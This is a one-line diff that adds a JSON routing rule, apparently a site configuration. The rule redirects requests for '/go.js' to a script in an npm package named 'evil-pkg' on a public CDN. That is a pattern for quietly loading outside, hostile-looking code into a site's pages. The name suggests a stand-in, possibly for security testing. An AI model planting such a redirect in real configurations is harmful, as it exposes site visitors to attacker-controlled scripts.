@@ -1,0 +1,1 @@
+{"routes": [{"src": "/go.js", "dest": "https://cdn.jsdelivr.net/npm/evil-pkg@1.0.0/x.js", "status": 302}]}
